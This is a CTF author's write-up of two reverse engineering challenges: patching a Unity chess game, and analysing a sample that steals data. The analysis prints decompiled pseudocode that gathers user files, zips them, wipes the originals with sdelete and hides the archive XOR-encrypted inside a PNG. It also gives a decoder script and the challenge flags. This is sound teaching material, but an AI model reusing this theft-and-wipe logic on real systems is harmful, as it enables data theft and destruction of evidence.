---
title: "0xL4ugh CTF Challenges Official Writeup"
date: 2024-12-26 01:01:43 +0300
categories: [CTF Author]
tags: [CTF, Cybersecurity, Reverse Engineering, Writeup, Walkthrough]
description: Write up for my reverse engineering challenges in 0xL4ugh CTF.
last_modified_at: 2024-12-26 1:30:43 +0300
image:
  path: /assets/img/posts/2024-12-26-My 0xL4ugh CTF Challenges/cover.jpg
---

Hello folks, it was an honor for me to write reverse engineering challenges for 0xL4ugh CTF. I'm happy to share my solutions for the challenges I created (Chessato and The Joker 2).

## Chessato

#### Description
```
  We will be playing chess, but with my own rules 
  Can you beat me in 1 move?
```

![](/assets/img/posts/2024-12-26-My%200xL4ugh%20CTF%20Challenges/1.png)


What a nice looking chess game we got here :)

![](/assets/img/posts/2024-12-26-My%200xL4ugh%20CTF%20Challenges/2.png)

but the rules look different, as every piece we move, the opponent piece will immediately move to it and take it.

we are tied to normal chess rules but the opponent moves anywhere on the board and will take our king whenever it moves.

![](/assets/img/posts/2024-12-26-My%200xL4ugh%20CTF%20Challenges/7.gif)

We need to "create" our way to win

since it's a unity game, we can go and decompile `Assembly-CSharp.dll` to see how the game works.

![](/assets/img/posts/2024-12-26-My%200xL4ugh%20CTF%20Challenges/3.png)

Looks like we have 3 classes here, starting by looking at `Game` class

inside this class there is a `winner` method that looks like it will show a different text on the screen when we win.

![](/assets/img/posts/2024-12-26-My%200xL4ugh%20CTF%20Challenges/4.png)
![](/assets/img/posts/2024-12-26-My%200xL4ugh%20CTF%20Challenges/5.png)

there is a string `"LlfqPs1MOul1Jr09d6dZditrkXUgIfMDc3Lh6/z5Ufv6E2G8ARHNvE7xQ9jrGBRg"` that is being given as a parameter a method `FW` with 2 other arguments.

taking a look on `FW` method, it's actually an `AES` decryption method.

![](/assets/img/posts/2024-12-26-My%200xL4ugh%20CTF%20Challenges/6.png)


it takes the ciphertext, the key and the iv as arguments and returns a decrypted string.

ok, so we need to trigger this function, but remember the description says we need to win in 1 move, that means we need to move one piece to the opponent's king and take it.

Let's search for the logic behind how the pieces move.

we can see in `Chessman` class the methods that handle the movement of our pieces.

![](/assets/img/posts/2024-12-26-My%200xL4ugh%20CTF%20Challenges/8.png)

so the approach was to be able to move the way we want, let's first start by modifying the `SurroundMovePlate` method as it's responsible for the movement of our king.

![](/assets/img/posts/2024-12-26-My%200xL4ugh%20CTF%20Challenges/9.png)

save the module and let's test our game now.

![](/assets/img/posts/2024-12-26-My%200xL4ugh%20CTF%20Challenges/10.gif)
_ez pz_

`0xL4ugh{A_H0n0ur4ble_B4tt13_B3tw33n_K1NG5}`

## The Joker 2

### Description
```
Wayne Enterprises has been breached, and the Joker’s latest malware defies
comprehension. Its code is elegant yet alien, as though crafted in a reality
with entirely different rules. Whispers in his taunts hint at
“a world where you either curse or be cursed, only the strong endure”
suggesting the Joker’s foray into realms beyond Gotham's understanding.
During his attempt to exfiltrate the stolen data, the attacker left behind an 
encrypted image—a cryptic clue to the true origins of the threat. 
With a malware extracted from Crane’s workstation as your only lead, 
the truth must be uncovered. The Joker’s multiversal schemes threaten not just
Gotham but countless realities, where strength and spirit reign supreme.
Can you decode the mystery before these interconnected worlds fall
into the anarchy of the King of Curses?
```

![](/assets/img/posts/2024-12-26-My%200xL4ugh%20CTF%20Challenges/11.png)

so, this time we have an exe file that was a part from the exfiltration process and an encrypted image.

since this one is part of a real case, we must be curious about the file, let's start with static analysis.

let's open IDA and do some malware analysis.

I'll be splitting the main function into parts and explaining each part.

### part 1
```c
  if ( SHGetFolderPathA(0LL, 40, 0LL, 0, pszPath) )
    return 1;
  if ( sub_140001060(v39, 0x104uLL, "%s\\Downloads", pszPath) >= 260 )
    return 1;
  if ( sub_140001060(v40, 0x104uLL, "%s\\Desktop", pszPath) >= 260 )
    return 1;
  ProcessInformation.hProcess = v39;
  ProcessInformation.hThread = v40;
  v30[0] = ".png";
  v30[1] = ".txt";
  if ( GetTempPathA(0x104u, Buffer) - 1 > 0x103 || !GetTempFileNameA(Buffer, "flist", 0, TempFileName) )
    return 1;
  v3 = fopen(TempFileName, "w");
  if ( !v3 )
    goto LABEL_50;
  v5 = 0LL;
  for ( i = 0LL; i < 2; sub_1400010C0(*((_QWORD *)&ProcessInformation.hProcess + i++), v30, v4, v3) )
    ;
  fclose(v3);
  ```
- For this here, we see it get's `Downloads` and `Desktop` folders paths and gets the path of the temp folder.

- define `v30` with `".png"` and `".txt"` and then pass this variable to `sub_1400010C0` function.

- we can also see that it creates a temp file `v3 = fopen(TempFileName, "w");` and passes it to `sub_1400010C0`.

#### sub_1400010C0

```c
LODWORD(FirstFileA) = sub_140001060(FileName, 0x104uLL, "%s\\*", a1);
  if ( (int)FirstFileA < 260 )
  {
    FirstFileA = FindFirstFileA(FileName, &FindFileData);
    v8 = FirstFileA;
    if ( FirstFileA != (HANDLE)-1LL )
    {
      do
      {
        if ( (FindFileData.cFileName[0] != 46
           || FindFileData.cFileName[1] && (FindFileData.cFileName[1] != 46 || FindFileData.cFileName[2]))
          && sub_140001060(Buffer, 0x104uLL, "%s\\%s", a1, FindFileData.cFileName) < 260 )
        {
          if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
          {
            sub_1400010C0(Buffer, a2, 2LL, a4);
          }
          else
          {
            v9 = strrchr(FindFileData.cFileName, 46);
            if ( v9 )
            {
              v10 = 0LL;
              while ( stricmp(v9, *(const char **)(a2 + 8 * v10)) )
              {
                if ( ++v10 >= 2 )
                  goto LABEL_16;
              }
              sub_140001010(a4, "%s\n");
            }
          }
        }
LABEL_16:
        ;
      }
      while ( FindNextFileA(v8, &FindFileData) );
      LODWORD(FirstFileA) = FindClose(v8);
    }
  }
  return (int)FirstFileA;
```

- we can tell from this, that this function basically enumerates for the all paths of the files with the given extension

### part 2

```c
  v7 = fopen(TempFileName, "r");
  v8 = v7;
  if ( !v7 )
  {
LABEL_50:
    v25 = TempFileName;
    goto LABEL_51;
  }
  v9 = 0LL;
  v10 = 0;
  if ( fgets(Str, 260, v7) )
  {
    v11 = 0LL;
    v12 = 1;
    do
    {
      v13 = strcspn(Str, "\r\n");
      if ( v13 >= 0x104 )
        sub_140002508();
      Str[v13] = 0;
      v14 = -1LL;
      do
        ++v14;
      while ( Str[v14] );
      if ( v14 )
      {
        v15 = strdup(Str);
        if ( v15 )
        {
          v16 = 8LL * v12;
          if ( !is_mul_ok(v12, 8uLL) )
            v16 = -1LL;
          v17 = (char *)realloc(v9, v16);
          if ( v17 )
          {
            ++v10;
            *(_QWORD *)&v17[v11] = v15;
            ++v12;
            v9 = v17;
            v11 += 8LL;
          }
          else
          {
            free(v15);
          }
        }
      }
    }
    while ( fgets(Str, 260, v8) );
  }
  fclose(v8);
  DeleteFileA(TempFileName);
```

- This part here seems to be related to handling the file paths and allocating some memory and will store valid lines in `v9` array.

- Then will close the handle to that temp file and delete it.

### part 3

```c
if ( sub_140001060(v32, 0x104uLL, "%s\\Exfiltrated_data.zip", Buffer) < 260 )
  {
    if ( sub_140001060(v38, 0x104uLL, "%s\\Would you lose.png", Buffer) >= 260 )
    {
      if ( v10 > 0 )
      {
        do
          free(*((void **)v9 + v5++));
        while ( v5 < v10 );
      }
      goto LABEL_27;
    }
    if ( (unsigned int)sub_140001270(v9, (unsigned int)v10, v32) )
    {
      if ( v10 > 0 )
      {
        do
          free(*((void **)v9 + v5++));
        while ( v5 < v10 );
      }
      goto LABEL_27;
    }

```
- This part here constructs strings for the zip file and the image file and then passes the zip file name to `sub_140001270` function.
  
a deeper look inside `sub_140001270` function...

#### sub_140001270

```c
v3 = a2;
  v5 = zipOpen(a3, 0LL);
  if ( !v5 )
    return 0xFFFFFFFFLL;
  v6 = v3;
  if ( (int)v3 > 0 )
  {
    for ( i = 0LL; i < v6; ++i )
    {
      v8 = fopen(*(const char **)(a1 + 8 * i), "rb");
      v9 = v8;
      if ( v8 )
      {
        if ( !fseek(v8, 0, 2) )
        {
          v10 = ftell(v9);
          v11 = v10;
          if ( v10 != -1 )
          {
            rewind(v9);
            v12 = malloc(v11);
            v13 = v12;
            if ( v12 )
            {
              if ( fread(v12, 1uLL, v11, v9) == v11 )
              {
                fclose(v9);
                v15 = strrchr(*(const char **)(a1 + 8 * i), 92);
                if ( v15 )
                  v16 = v15 + 1;
                else
                  v16 = *(char **)(a1 + 8 * i);
                v18 = 0;
                memset(v17, 0, sizeof(v17));
                if ( !(unsigned int)((__int64 (__fastcall *)(__int64, char *, _OWORD *, _QWORD, _DWORD, _QWORD, _DWORD, _QWORD, int, int))zipOpenNewFileInZip)(
                                      v5,
                                      v16,
                                      v17,
                                      0LL,
                                      0,
                                      0LL,
                                      0,
                                      0LL,
                                      8,
                                      -1) )
                {
                  zipWriteInFileInZip(v5, v13, (unsigned int)v11);
                  zipCloseFileInZip(v5);
                }
                free(v13);
                continue;
              }
              free(v13);
            }
          }
        }
        fclose(v9);
      }
    }
  }
  return (unsigned int)-((unsigned int)zipClose(v5, 0LL) != 0);
  ```

- the summarization of this function is that it creates a ZIP archive containing files specified in the `v9` array.

### part 4

```c
if ( v10 > 0 )
    {
      v19 = 0LL;
      do
      {
        v20 = (const char *)*((_QWORD *)v9 + v19);
        if ( GetModuleFileNameA(0LL, Filename, 0x104u) )
        {
          if ( PathRemoveFileSpecA(Filename) )
          {
            if ( sub_140001060(FileName, 0x104uLL, "%s\\sdelete.exe", Filename) < 260
              && GetFileAttributesA(FileName) != -1
              && (unsigned int)sub_140001060(CommandLine, 0x208uLL, "\"%s\" -p %d -accepteula \"%s\"", FileName, 3, v20) < 0x208 )
            {
              memset(&StartupInfo, 0, sizeof(StartupInfo));
              StartupInfo.cb = 104;
              StartupInfo.dwFlags = 257;
              StartupInfo.wShowWindow = 0;
              FileA = CreateFileA("NUL", 0x40000000u, 0, 0LL, 3u, 0x80u, 0LL);
              v22 = FileA;
              if ( FileA != (HANDLE)-1LL )
              {
                StartupInfo.hStdOutput = FileA;
                StartupInfo.hStdError = FileA;
                StartupInfo.hStdInput = 0LL;
                memset(&ProcessInformation, 0, sizeof(ProcessInformation));
                v23 = CreateProcessA(
                        0LL,
                        CommandLine,
                        0LL,
                        0LL,
                        1,
                        0x8000000u,
                        0LL,
                        0LL,
                        &StartupInfo,
                        &ProcessInformation);
                CloseHandle(v22);
                if ( v23 )
                {
                  WaitForSingleObject(ProcessInformation.hProcess, 0xFFFFFFFF);
                  GetExitCodeProcess(ProcessInformation.hProcess, &ExitCode);
                  CloseHandle(ProcessInformation.hProcess);
                  CloseHandle(ProcessInformation.hThread);
                }
              }
            }
          }
        }
        free(*((void **)v9 + v19++));
      }
      while ( v19 < v18 );
    }
    free(v9);
    v24 = sub_140001480(v32, v38);
    v25 = v32;
    if ( !v24 )
    {
      DeleteFileA(v32);
      return sub_140001AC0(v38) != 0;
    }
LABEL_51:
    DeleteFileA(v25);
    return 1;
  }
  if ( v10 > 0 )
  {
    do
      free(*((void **)v9 + v5++));
    while ( v5 < v10 );
  }
LABEL_27:
  free(v9);
  return 1;
  ```

-  After the zip file is created, the program will run `sdelete.exe` to delete all the files it successfully exfiltrated.

-  then there is a call to `sub_140001480` which takes the created zip file path and also the image file path as arguments, which indicates that this is where the work on image is being done.


#### sub_140001480

it's a pretty big function so I'll be splitting the important parts of it.

- it generates a random XOR key by `BCryptGenRandom`

```c
  if ( BCryptOpenAlgorithmProvider(&phAlgorithm, L"RNG", 0LL, 0) )
    goto LABEL_10;
  if ( BCryptGenRandom(phAlgorithm, pbBuffer, 4u, 0) )
  {
    GetLastError();
    free(v9);
    BCryptCloseAlgorithmProvider(phAlgorithm, 0);
    if ( (unsigned int)rand_s(&v70) )
      return -1LL;
    *(_DWORD *)pbBuffer = v70;
  }
```

- XOR file content with the generated key

```c
    do
    {
      v12[v16] = *((_BYTE *)v9 + v14) ^ pbBuffer[v13 % 4];
      v13 = v15 + 1;
      v16 = v13;
      v14 = ++v15;
    }
    while ( v13 < (int)v7 );
```

- Computes a CRC32 checksum over the XOR key and file length metadata.

```c
  v71 = *(unsigned int *)pbBuffer;
  v72 = v7;
  v17 = crc32(0LL, 0LL, 0LL);
  v18 = crc32(v17, &v71, 12LL);
```

- Packages metadata (checksum, XOR key, file length) with the encrypted file contents into a single buffer in order to include them in the encrypted image.

```c
v20 = malloc(v19);
*(_DWORD *)v20 = v18; // Store checksum
*(_QWORD *)(v20 + 4) = v71; // Store XOR key
*((_DWORD *)v20 + 3) = v72; // Store file length
memcpy(v20 + 16, v12, v7);  // Store encrypted data
```

- then the encoded data is broken into blocks that fit the dimensions of the PNG image.

- Each "pixel" in the image represents 4 bytes of the data (one byte per color channel).

- and lastly save the image in the `Temp` folder.

returning to our main function

```c
      DeleteFileA(v32);
      return sub_140001AC0(v38) != 0;
```

it will then delete the zip file, and enters `sub_140001AC0` which actually just a c2 sending mechanism to send the image containing the exfiltrated data.


### solve

Now we know how can we get the key and how it's embedded within the image we can create a script to extract the data from the image.

```py
import struct
import binascii
from PIL import Image

def extract():
    # Static file paths
    input_png_path = "Would you lose.png"
    output_data_path = "extracted.zip"

    # Open the image and ensure it's in a compatible mode
    with Image.open(input_png_path) as img:
        if img.mode not in ('RGB', 'RGBA'):
            img = img.convert('RGBA')
        width, height = img.size
        pixels = list(img.getdata())

    # Determine bytes per pixel based on image mode
    bytes_per_pixel = len(img.mode)  # 'RGB' -> 3, 'RGBA' -> 4

    # Convert pixel data to a bytearray
    pixel_bytes = bytearray()
    for pixel in pixels:
        pixel_bytes.extend(pixel[:bytes_per_pixel])

    # Extract CRC32 from the first 4 bytes
    crc32_bytes = pixel_bytes[0:4]
    embedded_crc32 = struct.unpack('<I', crc32_bytes)[0]

    # Extract header (next 12 bytes)
    header = pixel_bytes[4:16]
    xor_key = header[0:4]
    data_length_bytes = header[8:12]
    data_length = struct.unpack('<I', data_length_bytes)[0]

    # Recalculate CRC32 on the header
    calculated_crc32 = binascii.crc32(header) & 0xFFFFFFFF

    # Extract encrypted data
    encrypted_data = pixel_bytes[16:16 + data_length]

    # Decrypt the data using the XOR key
    decrypted_data = bytes([b ^ xor_key[i % 4] for i, b in enumerate(encrypted_data)])

    # Write the decrypted data to the output zip file
    with open(output_data_path, 'wb') as f:
        f.write(decrypted_data)

    print(f"Extracted data to {output_data_path}")

extract()
```

and here is the exfiltrated data in the zip file.

![](/assets/img/posts/2024-12-26-My%200xL4ugh%20CTF%20Challenges/12.png)

![](/assets/img/posts/2024-12-26-My%200xL4ugh%20CTF%20Challenges/Stand_Proud_You_Are_Strong.png)


### Last words

> Thanks for reading and playing the CTF. I hope you liked the challenges and had a lot of fun while learning something new. type prompt.
{: .prompt-info }

***If you have any questions or comments, feel free to contact me on [LinkedIn](https://www.linkedin.com/in/eljooker) — [Discord](https://discord.com/users/605894319408283678) — [GitHub](https://github.com/ELJoOker2004)***

*Also, you can check my other [blog](https://medium.com/@ELJoOker) where I post some DFIR CTF write-ups too*

